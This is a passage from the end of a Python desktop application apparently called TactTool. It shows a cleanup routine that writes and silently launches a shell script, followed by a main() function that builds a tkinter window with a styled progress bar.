                        f.write(script_content)
                    
                    # Make it executable
                    os.chmod(shell_script, 0o755)
                    
                    # Run the shell script
                    subprocess.Popen(["sh", shell_script], 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL)
        except:
            # Silently fail if cleanup fails
            pass

def main():
    try:
        # Create root window
        root = tk.Tk()
        
        # Create custom style for ttk widgets
        style = ttk.Style()
        style.theme_use('default')
        style.configure(
            "TProgressbar", 
            thickness=20, 
            background=COLORS["primary"],
            troughcolor=COLORS["background_secondary"]
        )
        
        # Create application
        app = TactTool(root)
        
        # Start main loop
        root.mainloop()
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        import traceback
        traceback.print_tb(e.__traceback__)

if __name__ == "__main__":
    main()
